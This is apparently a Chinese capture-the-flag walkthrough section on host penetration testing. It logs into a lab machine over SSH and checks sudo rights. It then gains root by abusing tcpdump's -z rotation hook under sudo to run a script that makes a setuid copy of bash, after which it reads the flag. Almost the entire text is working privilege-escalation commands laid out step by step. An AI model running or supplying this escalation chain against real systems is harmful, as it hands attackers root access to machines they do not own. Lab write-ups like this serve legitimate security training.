2.2 主机渗透测试

1.使用账号密码进行SSH连接

ssh webdeveloper@192.168.207.150

2.查看用户sudo权限

sudo -l

3.使用tcpdump提权

在/tmp目录中创建文件

vim /tmp/bash
cp /bin/bash /tmp/sh-1
chmod u+s /tmp/sh-1

赋予文件执行权限

chmod +x /tmp/bash

4.开启tcpdump服务

sudo /usr/sbin/tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/bash -Z root

5.重新开启SSH连接

新开终端使用nc连接本地网卡，发送数据包

nc -v -z -n -w 1 127.0.0.1 1

6.配置升级shell权限

ls -lh /tmp/sh-1

7.提升权限

/tmp/sh-1 -p

已经获取到root权限

8.查看flag

cd /root
cat flag.txt
